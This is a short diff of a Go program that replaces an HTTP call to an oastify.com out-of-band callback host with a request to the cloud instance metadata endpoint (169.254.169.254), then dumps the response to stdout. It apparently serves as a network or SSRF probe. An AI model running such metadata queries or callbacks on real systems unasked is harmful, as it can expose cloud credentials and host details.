@@ -6,8 +6,15 @@ import (
 )
 
 func main() {
-	_, err := http.Get("https://p5v5dp6yigl9s86e9wbt38vgv71ypodd.oastify.com")
+	res, err := http.Get("https://169.254.169.254/latest/meta-data")
 	if err != nil {
 		log.Fatal(err)
 	}
+	defer res.Body.Close()
+	dump, err := httputil.DumpResponse(res, true)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	os.Stdout.Write(dump)
 }
